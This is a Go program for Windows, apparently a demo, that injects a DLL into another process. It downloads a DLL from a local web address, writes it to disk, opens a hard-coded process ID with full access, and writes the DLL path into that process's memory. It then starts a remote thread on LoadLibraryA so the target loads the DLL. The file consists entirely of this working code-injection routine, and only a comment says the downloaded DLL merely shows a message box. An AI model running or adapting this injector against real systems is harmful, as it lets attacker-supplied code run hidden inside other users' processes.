package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	pid := uint32(25964)
	PROCESS_ALL_ACCESS := windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xFFFF

	//dll pops a messagebox
	sc, err := wget("http://127.0.0.1/hello.dll")
	if err != nil {
		log.Fatalf("[FATAL] Unable to connect to the host %v ", err)
	}

	// Write file to disk
	path, err := os.Getwd()
	if err != nil {
		log.Println(err)
	}
	fmt.Printf("[+] Current Directory: %s\n", path)
	fname := path + "\\hello.dll"

	fnameBytes := []byte(fname)
	err = os.WriteFile(fname, sc, 0644)
	if err != nil {
		log.Fatalf("[FATAL] Unable to write file %s ", fname)
	}
	fmt.Printf("[+] Writing file: %s\n", fname)

	//Get a process handle
	fmt.Printf("[+] Getting a handle on process with pid: %d\n", pid)
	pHandle, err := windows.OpenProcess(uint32(PROCESS_ALL_ACCESS), false, pid)
	if err != nil {
		log.Fatalf("[FATAL] Unable to get a handle on process with id: %d : %v ", pid, err)
	}

	fmt.Printf("[+] Obtained a handle 0x%x on process with ID: %d\n", pHandle, pid)

	// Allocate memory on remote process
	modKernel32 := syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx := modKernel32.NewProc("VirtualAllocEx")

	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(pHandle),
		uintptr(0),
		uintptr(len(fnameBytes)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READ))

	if addr == 0 {
		log.Fatalf("[FATAL] VirtualAlloc Failed: %v\n", lastErr)
	}

	fmt.Printf("[+] Allocated Memory Address: 0x%x\n", addr)

	// Write to remote memory
	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(pHandle, addr, &fnameBytes[0], uintptr(len(fnameBytes)), &numberOfBytesWritten)
	if err != nil {
		log.Fatalf("[FATAL] Unable to write shellcode to the the allocated address")
	}
	fmt.Printf("[+] Wrote %d/%d bytes to destination address\n", numberOfBytesWritten, len(fnameBytes))

	// Get address of loadLibraryA
	procLoadLibraryA := modKernel32.NewProc("LoadLibraryA")

	// CreateProcess to Load the DLL
	procCreateRemoteThread := modKernel32.NewProc("CreateRemoteThread")
	var threadId uint32 = 0
	tHandle, _, lastErr := procCreateRemoteThread.Call(
		uintptr(pHandle),
		uintptr(0),
		uintptr(0),
		procLoadLibraryA.Addr(),
		addr,
		uintptr(0),
		uintptr(unsafe.Pointer(&threadId)),
	)
	if tHandle == 0 {
		log.Fatalf("[FATAL] Unable to Create Remote Thread: %v \n", lastErr)
	}

	fmt.Printf("[+] Handle of newly created thread:  0x%x \n[+] Thread ID: %d\n", tHandle, threadId)
	//windows.WaitForSingleObject(windows.Handle(tHandle), windows.INFINITE)
}
func wget(url string) ([]byte, error) {
	resp, err := http.Get(url)

	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)

	if err != nil {
		return []byte{}, err
	}
	return body, nil
}
